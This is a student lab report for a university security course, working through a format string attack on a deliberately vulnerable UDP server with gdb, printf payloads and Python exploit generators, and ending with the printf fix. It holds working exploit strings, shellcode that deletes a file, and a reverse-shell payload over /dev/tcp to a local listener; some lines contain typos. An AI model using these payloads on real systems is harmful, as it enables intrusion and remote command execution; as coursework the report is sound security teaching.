*CS315 Computer Security*

<center><font size=72><b>Lab Assignment3</b></font></center>

<center>Name｜Yubin Hu</center>

<center>ID｜11712121</center>

<center>Date｜2020.09.30</center>



turn off the address randomization

```
sudo sysctl -w kernel.randomize_va_space=0
```



## Task 1: The Vulnerable Program

### Compilation

```
gcc -z execstack -o server server.c -g
```

![image-20200930113136101](lab3.assets/image-20200930113136101.png)



### Running and testing the server

```
// On the server VM
$ sudo ./server

// On the client VM
$ nc -u 10.0.2.5 9090 message typed by you
```

![image-20200930113221294](lab3.assets/image-20200930113221294.png)



## Task 2: Understanding the Layout of the Stack

![image-20200930111003256](lab3.assets/image-20200930111003256.png)

### Question 1

> What are the memory addresses at the locations marked by 1􏰂, 2􏰃, and 􏰄3?

We use gdb to look for the address. 

- First we set a breakpoint at line 14(the first line in myprint()).
- `run`, then we get EBP
- `nexti`, to execute instructions and push the arguments into the stack, then we get ESP
- When we return to main, we print the address of buf  `p &buf`



1. format string: ESP: 0xbfffe740
2. return address: EBP + 4 = 0xbfffe758 + 4 = 0xbfffe75c
3. buf: 0xbfffe7a0

![image-20200930145902774](lab3.assets/image-20200930145902774.png)

![image-20200930113543018](lab3.assets/image-20200930113543018.png)

![image-20200930113649571](lab3.assets/image-20200930113649571.png)

### Question 2

> What is the distance between the locations marked by 􏰂1 and  3􏰄?

0xbfffe7a0 - 0xbfffe740 = 0x60



## Task 3: Crash the Program

Input: `%s%s%s%s`

Stopped reason: SIGSEGV

![image-20200930160018162](lab3.assets/image-20200930160018162.png)



## Task 4: Print Out the Server Program’s Memory

### Task 4.A: Stack Data

By test and observation, the 5th byte after the format string stores the input string's address.

So we use `%x.%x.%x.%x.%s` to get the stack data.

Also we can find that the 4th byte is 0x3, obviously invalid, so Task 3 crashed.

![image-20200930165352742](lab3.assets/image-20200930165352742.png)

### Task 4.B: Heap Data

```
echo $(printf "\xc0\x87\x04\x08")%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s
```

- First, we find the string secret's address (0x080487c0)
- Because the distance is 0x60, one `%x` moves pointer 4bytes, so we skip 23 `%x`, and the 24th is secret.

![image-20200930194141328](lab3.assets/image-20200930194141328.png)



## Task 5: Change the Server Program’s Memory

### Task 5.A: Change the value to a different value

- target's address is 0x0804a040

```
echo $(printf "\x40\xa0\x04\x08")_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x%n
```

![image-20201001001355675](lab3.assets/image-20201001001355675.png)

### Task 5.B: Change the value to **0x500**

0x500 = 1280

```
echo $(printf "\x40\xa0\x04\x08")_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.1277x%n
```

![image-20201001001706164](lab3.assets/image-20201001001706164.png)

### Task 5.C: Change the value to **0xFF990000**

```
echo $(printf "\x43\xa0\x04\x08\x40\xa0\x04\x08\x41\xa0\x04\x08\x11\x22\x33\x44\x42\xa0\x04\x08")_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.36x%hnn%_hnn%hnn%.153x%hnn | nc -u 127.0.0.1 9090
```

0xFF

0xFF + 1 = 0x00

0x00 + 0 = 0x00

0x00 + 153 = 0x99

![image-20201001010643088](lab3.assets/image-20201001010643088.png)



> In format string attacks, changing the content of a memory space to a very small value is quite challenging

To get a very small value, we need to use an overflow technique.

First, we use `%x` to achieve the address of variable. In order to get the specified length of output, we use format specifier. So we may not be able to directly obtain small value, and we use overflow to do that. 

In addition, 0x00 can't be output in terminal, so if our memory space is 16-bit, we can use $2^{16}$ to represent 0x00, the lower part of the $2^{16}$ is 0x00 and the high part does not be stored.



## Task 6: Inject Malicious Code into the Server Program

> It should be noted that we can put NOP (\0x90) at the beginning of our shellcode to make our life easier

In this way, even if we fail to jump to the starting address of the shellcode, we can enter the shellcode smoothly even if we jump to the nop, which improves our fault tolerance rate.



Shellcode start address is shown :

![image-20201007153105089](lab3.assets/image-20201007153105089.png)

And it's complicated to generate the string, so we use a python script to do this work.

```python
from struct import pack

shellcode = '\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x68ile \x68/myf\x68/tmp\x68/rm \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'
nop = '\x90'

ret_addr = 0xBFFFE75C
target_addr = pack('<I', ret_addr) + pack('<I', ret_addr + 2)

nop_num = 0x100

shellcode_start_adr = 0xBFFFE7C0 + nop_num
high_adr, low_adr = divmod(shellcode_start_adr, 0x10000)

fill_num_1 = low_adr - 8 if low_adr > 8 else low_adr + 0x10000 - 8
fill_num_2 = high_adr - low_adr if high_adr > low_adr else high_adr + 0x10000 - low_adr

print("{target_addr}%{fill_num_1}x%24$hn%{fill_num_2}x%25$hn{nop}{shellcode}".format(target_addr=target_addr, fill_num_1=fill_num_1, fill_num_2=fill_num_2, nop=nop*nop_num, shellcode=shellcode))

```

And `/bin/bash -c "/bin/rm /tmp/myfile"` is executed.

![image-20201007152349394](lab3.assets/image-20201007152349394.png)



## Task 7: Getting a Reverse Shell

The same as Task 6, we just replace the shellcode and open another shell to listen to port 7070.

```
echo $(printf "\x3e\xe7\xff\xbf\x11\x22\x33\x44\x3c\xe7\xff\xbf\x11\x22\x33\x44\x3f\xe7\xff\xbf\x11\x22\x33\x44\x3d\xe7\xff\xbf").%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.50x%hhn%.65x%hhn%.127x%hhn%.41x%hhn$(printf "\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x682>&1\x68<&1 \x6870 0\x681/70\x680.0.\x68127.\x68tcp/\x68dev/\x68 > /\x68h -i\x68/bas\x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80") | nc -u 127.0.0.1 9090
```

or python

```python
from struct import pack

shellcode = '\x31\xc0\x50\x68bash\x68////\x68/bin\x 89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x682>&1\x68<&1 \x6870 0\x681/7 0\x680.0.\x68127.\x68tcp/\x68dev/\x68 > /\x68h -i\x68/bas\x68/bin\x89\xe2 \x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'
nop = '\x90'

ret_addr = 0xBFFFE75C
target_addr = pack('<I', ret_addr) + pack('<I', ret_addr + 2)

nop_num = 0x100
Z
shellcode_start_adr = 0xBFFFE7C0 + nop_num
high_adr, low_adr = divmod(shellcode_start_adr, 0x10000)

fill_num_1 = low_adr - 8 if low_adr > 8 else low_adr + 0x10000 - 8
fill_num_2 = high_adr - low_adr if high_adr > low_adr else high_adr + 0x10000 - low_adr

print("{target_addr}%{fill_num_1}x%24$hn%{fill_num_2}x%25$hn{nop}{shellcode}".format(target_addr=target_addr, fill_num_1=fill_num_1, fill_num_2=fill_num_2, nop=nop*nop_num, shellcode=shellcode))
```



We get a reverse shell and execute `pwd`.

![image-20201009154005870](lab3.assets/image-20201009154005870.png)



## Task 8: Fixing the Problem

> Remember the warning message generated by the gcc compiler?

![image-20201009150836799](lab3.assets/image-20201009150836799.png)

The gcc warning reminds us format not a string literal and not format arguments so that the compiler can't check the format of string and maybe cause the volnerability.

```c
// Origin
printf(msg);

// Fixed
printf("%s", msg);
```

![image-20201009151651787](lab3.assets/image-20201009151651787.png)

the vulnerability is fixed.